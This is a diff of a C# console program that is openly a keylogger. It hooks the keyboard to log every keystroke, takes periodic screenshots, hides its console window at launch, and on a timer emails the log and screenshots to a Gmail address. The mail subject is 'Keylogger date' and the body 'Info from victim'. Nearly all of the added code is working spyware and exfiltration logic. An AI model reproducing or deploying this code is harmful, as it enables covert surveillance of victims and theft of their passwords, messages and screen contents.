@@ -3,18 +3,17 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
-using System.Xml;
-using static System.Net.Mime.MediaTypeNames;
 using Application = System.Windows.Forms.Application;
 
 namespace Window_Log_on_Application
 {
     class Program
     {
-        #region hook key board
+        #region Hook key board
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
@@ -80,6 +79,7 @@ namespace Window_Log_on_Application
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
+                //CheckHotKey(vkCode);
                 WriteLog(vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -108,22 +108,30 @@ namespace Window_Log_on_Application
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
-        #endregion
 
-        #region Timer
-        static void StartTimer()
+        static bool isHotKey = false;
+        static bool isShowing = false;
+        static Keys previoursKey = Keys.Separator;
+
+        static void CheckHotKey(int vkCode)
         {
-            Thread thread = new Thread(() =>
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
+                isHotKey = true;
+
+            if (isHotKey)
             {
-                while (true)
+                if (!isShowing)
                 {
-                    Console.WriteLine("timer");
-                    Thread.Sleep(1000);
+                    DisplayWindow();
                 }
-                
-            });
-            thread.IsBackground = true;
-            thread.Start();
+                else
+                    HideWindow();
+
+                isShowing = !isShowing;
+            }
+
+            previoursKey = (Keys)vkCode;
+            isHotKey = false;
         }
         #endregion
 
@@ -132,7 +140,7 @@ namespace Window_Log_on_Application
         static string imageExtendtion = ".png";
 
         static int imageCount = 0;
-        static int captureTime = 100;
+        static int captureTime = 1000;
 
         /// <summary>
         /// Capture al screen then save into ImagePath
@@ -177,8 +185,115 @@ namespace Window_Log_on_Application
 
         #endregion
 
+        #region Timer
+        static int interval = 1;
+        static void StartTimer()
+        {
+            Thread thread = new Thread(() =>
+            {
+                while (true)
+                {
+                    Thread.Sleep(1);
+
+                    if (interval % captureTime == 0)
+                        CaptureScreen();
+
+                    if (interval % mailTime == 0)
+                        SendMail();
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
+                }
+
+            });
+            thread.IsBackground = true;
+            thread.Start();
+        }
+        #endregion
+
+        #region Windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        const int SW_HIDE = 0;
+
+        // show window code
+        const int SW_SHOW = 5;
+
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow(); 
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion
+
+        #region Mail
+        static int mailTime = 5000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("email@gmail.com");
+                mail.To.Add("gokudeptrai7@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info from victim\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+                // phải làm cái này ở mail dùng để gửi phải bật lên
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+        #endregion
         static void Main(string[] args)
         {
+            HideWindow();
+
             StartTimer();
             HookKeyboard();
         }
